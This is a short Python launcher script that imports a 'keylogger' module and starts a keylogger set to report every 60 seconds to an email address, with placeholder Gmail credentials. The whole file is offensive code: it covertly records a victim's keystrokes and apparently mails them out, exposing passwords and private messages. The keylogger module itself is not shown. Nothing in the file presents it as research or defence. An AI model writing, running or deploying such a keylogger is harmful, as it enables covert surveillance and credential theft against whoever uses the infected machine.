#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(60, "example@gmail.com", "password")
my_keylogger.start()